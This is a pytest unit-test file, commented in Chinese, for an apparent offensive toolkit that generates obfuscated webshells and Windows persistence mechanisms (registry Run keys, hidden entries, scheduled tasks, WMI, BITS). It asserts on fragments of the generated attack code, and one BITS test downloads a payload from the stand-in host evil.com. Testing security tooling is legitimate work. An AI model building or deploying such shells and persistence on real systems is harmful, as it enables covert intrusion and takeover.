# -*- coding: utf-8 -*-
"""
core/persistence 模块单元测试

覆盖:
- WebshellGenerator: PHP/JSP/ASPX/Python shell 生成、密码生成、混淆等级
- WindowsPersistence: 注册表/计划任务/服务/WMI/启动文件夹/屏保/BITS 持久化
- 便捷函数: generate_webshell / windows_persist / list_*
"""

import pytest

from core.persistence.webshell_manager import (
    ObfuscationLevel,
    WebshellGenerator,
    WebshellResult,
    WebshellType,
    generate_webshell,
    list_webshell_types,
)
from core.persistence.windows_persistence import (
    PersistenceMethod,
    PersistenceResult,
    WindowsPersistence,
    list_persistence_methods,
    windows_persist,
)


# ==================== WebshellGenerator 测试 ====================


@pytest.mark.unit
class TestWebshellGeneratorInit:
    """WebshellGenerator 实例化测试"""

    def test_init(self):
        """实例化不应抛异常"""
        gen = WebshellGenerator()
        assert gen._random_seed  # 非空
        assert len(gen._random_seed) == 8

    def test_generate_password(self):
        """密码生成: 非空、长度正确、密码学安全"""
        gen = WebshellGenerator()
        pw = gen._generate_password()
        assert len(pw) == 12
        assert pw.isalnum()

    def test_generate_password_custom_length(self):
        """自定义密码长度"""
        gen = WebshellGenerator()
        pw = gen._generate_password(length=24)
        assert len(pw) == 24

    def test_generate_filename(self):
        """文件名格式正确"""
        gen = WebshellGenerator()
        fn = gen._generate_filename("php")
        assert fn.endswith(".php")
        assert "_" in fn


@pytest.mark.unit
class TestPHPWebshell:
    """PHP Webshell 生成测试"""

    def test_basic_shell(self):
        """基础 PHP shell 包含 <?php 和密码 MD5 校验"""
        gen = WebshellGenerator()
        result = gen.php_shell(password="test123", shell_type="basic")
        assert isinstance(result, WebshellResult)
        assert result.success is True
        assert "<?php" in result.content
        assert result.password == "test123"
        # MD5 校验逻辑
        assert "md5" in result.content

    def test_eval_shell(self):
        """eval 变形 shell"""
        gen = WebshellGenerator()
        result = gen.php_shell(password="pw", shell_type="eval")
        assert result.success is True
        assert "eval" in result.content
        assert "base64_decode" in result.content

    def test_assert_shell(self):
        """assert 绕过 shell"""
        gen = WebshellGenerator()
        result = gen.php_shell(password="pw", shell_type="assert")
        assert result.success is True
        assert "ass" in result.content  # 'ass'.'ert' 拼接

    def test_callback_shell(self):
        """回调函数 shell"""
        gen = WebshellGenerator()
        result = gen.php_shell(password="pw", shell_type="callback")
        assert result.success is True
        assert "array_" in result.content

    def test_auto_password_generation(self):
        """不传密码时自动生成"""
        gen = WebshellGenerator()
        result = gen.php_shell()
        assert result.password  # 非空
        assert len(result.password) >= 12

    def test_unknown_type_fallback(self):
        """未知类型应回退到默认"""
        gen = WebshellGenerator()
        result = gen.php_shell(shell_type="nonexistent")
        assert result.success is True
        assert "<?php" in result.content

    def test_php_memshell(self):
        """PHP 内存马"""
        gen = WebshellGenerator()
        result = gen.php_memshell(password="mem123")
        assert result.success is True
        assert "register_shutdown_function" in result.content
        assert "__mem_shell" in result.content
        assert result.shell_type == "php_memshell"


@pytest.mark.unit
class TestPHPObfuscation:
    """PHP 混淆等级测试"""

    def test_no_obfuscation(self):
        """NONE 等级不做任何混淆"""
        gen = WebshellGenerator()
        result = gen.php_shell(password="pw", obfuscation=ObfuscationLevel.NONE)
        # 原始代码直接包含 md5
        assert "md5" in result.content

    def test_low_obfuscation(self):
        """LOW 等级使用 base64 编码"""
        gen = WebshellGenerator()
        result = gen.php_shell(password="pw", obfuscation=ObfuscationLevel.LOW)
        assert "base64_decode" in result.content

    def test_medium_obfuscation(self):
        """MEDIUM 等级使用变量混淆 + base64"""
        gen = WebshellGenerator()
        result = gen.php_shell(password="pw", obfuscation=ObfuscationLevel.MEDIUM)
        # MEDIUM 混淆会将 base64_decode 拆分为字符串拼接 'base'.'64_'.'decode'
        assert "base" in result.content
        assert "eval" in result.content

    def test_high_obfuscation(self):
        """HIGH 等级使用多层混淆"""
        gen = WebshellGenerator()
        result = gen.php_shell(password="pw", obfuscation=ObfuscationLevel.HIGH)
        # 高混淆后原始关键字不应直接可见
        assert "base64_decode" in result.content
        assert result.success is True


@pytest.mark.unit
class TestJSPWebshell:
    """JSP Webshell 生成测试"""

    def test_basic_jsp(self):
        """基础 JSP shell 包含 <%@ page import"""
        gen = WebshellGenerator()
        result = gen.jsp_shell(password="jsptest", shell_type="basic")
        assert result.success is True
        assert "<%@ page import" in result.content
        assert "Runtime.getRuntime().exec" in result.content
        assert result.password == "jsptest"

    def test_runtime_jsp(self):
        """Runtime 反射变形 JSP"""
        gen = WebshellGenerator()
        result = gen.jsp_shell(password="pw", shell_type="runtime")
        assert result.success is True
        assert "Class.forName" in result.content

    def test_scriptengine_jsp(self):
        """ScriptEngine JSP"""
        gen = WebshellGenerator()
        result = gen.jsp_shell(password="pw", shell_type="scriptengine")
        assert result.success is True
        assert "ScriptEngine" in result.content

    def test_jsp_auto_password(self):
        """不传密码时自动生成"""
        gen = WebshellGenerator()
        result = gen.jsp_shell()
        assert result.password
        assert len(result.password) >= 12

    def test_jsp_memshell_filter(self):
        """JSP Filter 内存马返回 dict"""
        gen = WebshellGenerator()
        result = gen.jsp_memshell_filter(password="filter123")
        assert isinstance(result, dict)
        assert "inject_code" in result
        assert "password" in result
        assert result["password"] == "filter123"
        assert "SecurityFilter" in result["inject_code"]


@pytest.mark.unit
class TestASPXWebshell:
    """ASPX Webshell 生成测试"""

    def test_aspx_shell(self):
        """ASPX shell 包含 <%@ Page Language"""
        gen = WebshellGenerator()
        result = gen.aspx_shell(password="aspxpw")
        assert result.success is True
        assert '<%@ Page Language="C#"' in result.content
        assert "cmd.exe" in result.content
        assert result.password == "aspxpw"

    def test_aspx_auto_password(self):
        gen = WebshellGenerator()
        result = gen.aspx_shell()
        assert result.password
        assert len(result.password) >= 12


@pytest.mark.unit
class TestPythonWebshell:
    """Python Webshell 生成测试"""

    def test_python_shell_flask_route(self):
        """Python shell 包含 Flask route"""
        gen = WebshellGenerator()
        result = gen.python_shell(password="pypass")
        assert result.success is True
        assert "@app.route" in result.content
        assert "flask" in result.content.lower() or "Flask" in result.content
        assert "subprocess" in result.content
        assert result.password == "pypass"

    def test_python_auto_password(self):
        gen = WebshellGenerator()
        result = gen.python_shell()
        assert result.password
        assert len(result.password) >= 12


@pytest.mark.unit
class TestBehinderGodzilla:
    """冰蝎/哥斯拉兼容 shell 测试"""

    def test_behinder_shell(self):
        """冰蝎 shell 包含 AES 解密逻辑"""
        gen = WebshellGenerator()
        result = gen.behinder_shell()
        assert result.success is True
        assert "openssl_decrypt" in result.content or "AES128" in result.content
        assert result.shell_type == "behinder_php"

    def test_godzilla_shell(self):
        """哥斯拉 shell 包含 XOR 编码逻辑"""
        gen = WebshellGenerator()
        result = gen.godzilla_shell(password="gzpw", key="0123456789abcdef")
        assert result.success is True
        assert "gzpw" in result.content  # 密码嵌入
        assert result.shell_type == "godzilla_php"


@pytest.mark.unit
class TestGenerateWebshellConvenience:
    """generate_webshell 便捷函数测试"""

    @pytest.mark.parametrize(
        "shell_type",
        ["php", "jsp", "aspx", "python", "behinder", "godzilla", "php_memshell"],
    )
    def test_all_types_succeed(self, shell_type):
        """所有已知类型应返回 success=True"""
        result = generate_webshell(shell_type=shell_type, password="testpw")
        assert result["success"] is True
        assert result["password"]

    def test_unknown_type_fails(self):
        """未知类型应返回 success=False"""
        result = generate_webshell(shell_type="unknown_shell")
        assert result["success"] is False
        assert "error" in result

    def test_obfuscation_param(self):
        """混淆参数应生效"""
        result = generate_webshell(
            shell_type="php", password="pw", obfuscation="high"
        )
        assert result["success"] is True
        assert "base64_decode" in result["content"]


@pytest.mark.unit
class TestListWebshellTypes:
    """list_webshell_types 测试"""

    def test_returns_list(self):
        types = list_webshell_types()
        assert isinstance(types, list)
        assert len(types) >= 5
        # 每项都有 type, description 字段
        for t in types:
            assert "type" in t
            assert "description" in t


@pytest.mark.unit
class TestWebshellNoHardcodedSecrets:
    """生成的代码中不应包含非预期硬编码敏感信息"""

    def test_no_extraneous_credentials(self):
        """生成的 PHP shell 仅包含用户指定的密码 (MD5 形式)"""
        gen = WebshellGenerator()
        result = gen.php_shell(password="only_this_pw")
        # 密码以 MD5 形式存在，明文不应直接出现在 content 中
        # (basic 类型 md5 检查，明文密码不在代码里)
        assert result.password == "only_this_pw"


# ==================== WindowsPersistence 测试 ====================


@pytest.mark.unit
class TestWindowsPersistenceInit:
    """WindowsPersistence 实例化测试"""

    def test_init(self):
        """实例化不应抛异常"""
        p = WindowsPersistence()
        assert p._random_prefix
        assert len(p._random_prefix) == 4

    def test_generate_name(self):
        """名称生成包含前缀"""
        p = WindowsPersistence()
        name = p._generate_name("Test")
        assert name.startswith("Test")


@pytest.mark.unit
class TestRegistryPersistence:
    """注册表持久化代码生成测试"""

    def test_registry_run_hkcu(self):
        """HKCU 注册表 Run 键"""
        p = WindowsPersistence()
        result = p.registry_run(
            payload_path=r"C:\Windows\Temp\payload.exe",
            name="TestEntry",
            hive="HKCU",
        )
        assert isinstance(result, PersistenceResult)
        assert result.success is True
        assert result.method == PersistenceMethod.REGISTRY_RUN.value
        assert "HKCU" in result.location
        assert "CurrentVersion\\Run" in result.location
        assert "TestEntry" in result.location
        assert "reg delete" in result.cleanup_command

    def test_registry_run_hklm(self):
        """HKLM 注册表 Run 键"""
        p = WindowsPersistence()
        result = p.registry_run(
            payload_path=r"C:\payload.exe", hive="HKLM"
        )
        assert "HKLM" in result.location

    def test_registry_run_hidden(self):
        """隐藏注册表项 (Unicode 零宽字符)"""
        p = WindowsPersistence()
        result = p.registry_run(
            payload_path=r"C:\payload.exe",
            name="HiddenEntry",
            hidden=True,
        )
        # 名称应包含零宽空格
        assert "\u200b" in result.location

    def test_registry_run_auto_name(self):
        """不传名称时自动生成"""
        p = WindowsPersistence()
        result = p.registry_run(payload_path=r"C:\payload.exe")
        assert result.success is True
        assert result.location  # 非空

    def test_registry_run_powershell(self):
        """PowerShell 注册表持久化"""
        p = WindowsPersistence()
        result = p.registry_run_powershell(
            payload_path=r"C:\payload.ps1",
            name="PSEntry",
            encoded=True,
        )
        assert result.success is True
        assert result.method == PersistenceMethod.REGISTRY_RUN.value


@pytest.mark.unit
class TestScheduledTaskPersistence:
    """计划任务持久化代码生成测试"""

    def test_scheduled_task_onlogon(self):
        """onlogon 触发器"""
        p = WindowsPersistence()
        result = p.scheduled_task(
            payload_path=r"C:\payload.exe",
            name="MyTask",
            trigger="onlogon",
        )
        assert result.success is True
        assert result.method == PersistenceMethod.SCHEDULED_TASK.value
        assert "MyTask" in result.location
        assert "schtasks /delete" in result.cleanup_command

    def test_scheduled_task_auto_name(self):
        """自动生成名称"""
        p = WindowsPersistence()
        result = p.scheduled_task(payload_path=r"C:\payload.exe")
        assert result.success is True

    def test_scheduled_task_xml(self):
        """XML 格式计划任务"""
        p = WindowsPersistence()
        result = p.scheduled_task_xml(
            payload_path=r"C:\payload.exe",
            name="XMLTask",
            hidden=True,
        )
        assert isinstance(result, dict)
        assert "xml_content" in result
        assert "<?xml" in result["xml_content"]
        assert "XMLTask" in result["import_command"]
        assert "true" in result["xml_content"]  # hidden=true
        assert "cleanup_command" in result


@pytest.mark.unit
class TestServicePersistence:
    """Windows 服务持久化测试"""

    def test_service_create(self):
        p = WindowsPersistence()
        result = p.service_create(
            payload_path=r"C:\svc.exe",
            name="TestSvc",
            display_name="Test Service",
        )
        assert result.success is True
        assert result.method == PersistenceMethod.SERVICE.value
        assert "TestSvc" in result.location
        assert "sc delete" in result.cleanup_command


@pytest.mark.unit
class TestWMIPersistence:
    """WMI 事件订阅持久化测试"""

    @pytest.mark.parametrize("trigger", ["startup", "process", "time"])
    def test_wmi_subscription_triggers(self, trigger):
        """各种 WMI 触发条件"""
        p = WindowsPersistence()
        result = p.wmi_subscription(
            payload_path=r"C:\payload.exe",
            name="TestWMI",
            trigger=trigger,
        )
        assert isinstance(result, dict)
        assert "install_script" in result
        assert "cleanup_script" in result
        assert result["method"] == PersistenceMethod.WMI_SUBSCRIPTION.value
        assert "TestWMI" in result["subscription_name"]
        # PowerShell 脚本应包含 WQL 查询
        assert "WQL" in result["install_script"] or "WmiInstance" in result["install_script"]


@pytest.mark.unit
class TestOtherPersistenceMethods:
    """其他持久化方法测试"""

    def test_startup_folder_current_user(self):
        """当前用户启动文件夹"""
        p = WindowsPersistence()
        result = p.startup_folder(payload_path=r"C:\payload.exe", all_users=False)
        assert result.success is True
        assert result.method == PersistenceMethod.STARTUP_FOLDER.value
        assert "APPDATA" in result.location or "Startup" in result.location

    def test_startup_folder_all_users(self):
        """所有用户启动文件夹"""
        p = WindowsPersistence()
        result = p.startup_folder(payload_path=r"C:\payload.exe", all_users=True)
        assert "ProgramData" in result.location

    def test_screensaver(self):
        """屏保持久化"""
        p = WindowsPersistence()
        result = p.screensaver(payload_path=r"C:\evil.scr")
        assert result.success is True
        assert result.method == PersistenceMethod.SCREENSAVER.value
        assert "SCRNSAVE" in result.location

    def test_bits_job(self):
        """BITS Job 持久化"""
        p = WindowsPersistence()
        result = p.bits_job(
            payload_url="http://evil.com/payload.exe",
            local_path=r"C:\temp\payload.exe",
            name="TestBITS",
        )
        assert result.success is True
        assert result.method == PersistenceMethod.BITS_JOB.value
        assert "bitsadmin /cancel" in result.cleanup_command


@pytest.mark.unit
class TestGetAllMethods:
    """get_all_methods 综合接口测试"""

    def test_returns_multiple_methods(self):
        """应返回多种持久化方法"""
        p = WindowsPersistence()
        methods = p.get_all_methods(r"C:\payload.exe")
        assert isinstance(methods, list)
        assert len(methods) >= 4
        # 每项应包含 method, location, cleanup 字段
        for m in methods:
            assert "method" in m
            assert "location" in m
            assert "cleanup" in m
            assert "requires_admin" in m

    def test_contains_expected_methods(self):
        """应包含注册表、计划任务、服务、WMI、启动文件夹"""
        p = WindowsPersistence()
        methods = p.get_all_methods(r"C:\payload.exe")
        method_names = {m["method"] for m in methods}
        assert PersistenceMethod.REGISTRY_RUN.value in method_names
        assert PersistenceMethod.SCHEDULED_TASK.value in method_names
        assert PersistenceMethod.SERVICE.value in method_names
        assert PersistenceMethod.WMI_SUBSCRIPTION.value in method_names
        assert PersistenceMethod.STARTUP_FOLDER.value in method_names


@pytest.mark.unit
class TestWindowsPersistConvenience:
    """windows_persist 便捷函数测试"""

    def test_registry_method(self):
        result = windows_persist(
            payload_path=r"C:\payload.exe", method="registry", name="TestReg"
        )
        assert result["success"] is True
        assert result["method"] == PersistenceMethod.REGISTRY_RUN.value

    def test_task_method(self):
        result = windows_persist(
            payload_path=r"C:\payload.exe", method="task", name="TestTask"
        )
        assert result["success"] is True

    def test_wmi_method(self):
        result = windows_persist(
            payload_path=r"C:\payload.exe", method="wmi", name="TestWMI"
        )
        assert result["success"] is True
        assert "install_script" in result

    def test_bits_without_url_fails(self):
        """BITS 方法缺少 payload_url 应失败"""
        result = windows_persist(
            payload_path=r"C:\temp\file.exe", method="bits"
        )
        assert result["success"] is False
        assert "payload_url" in result["error"]

    def test_unknown_method_fails(self):
        result = windows_persist(
            payload_path=r"C:\payload.exe", method="unknown_method"
        )
        assert result["success"] is False
        assert "error" in result


@pytest.mark.unit
class TestListPersistenceMethods:
    """list_persistence_methods 测试"""

    def test_returns_list(self):
        methods = list_persistence_methods()
        assert isinstance(methods, list)
        assert len(methods) >= 6
        for m in methods:
            assert "method" in m
            assert "description" in m
            assert "stealth" in m

    def test_contains_core_methods(self):
        methods = list_persistence_methods()
        method_names = {m["method"] for m in methods}
        assert "registry" in method_names
        assert "task" in method_names
        assert "service" in method_names
        assert "wmi" in method_names
        assert "startup" in method_names


@pytest.mark.unit
class TestPersistenceErrorHandling:
    """错误处理测试"""

    def test_persistence_result_with_error(self):
        """PersistenceResult 可携带 error"""
        result = PersistenceResult(
            success=False,
            method="test",
            location="",
            error="something went wrong",
        )
        assert result.success is False
        assert result.error == "something went wrong"

    def test_webshell_result_fields(self):
        """WebshellResult 包含全部必要字段"""
        result = WebshellResult(
            success=True,
            shell_type="php_basic",
            content="<?php ?>",
            password="pw",
            filename="test.php",
            usage="POST: ...",
            detection_tips="tip",
        )
        assert result.success is True
        assert result.detection_tips == "tip"
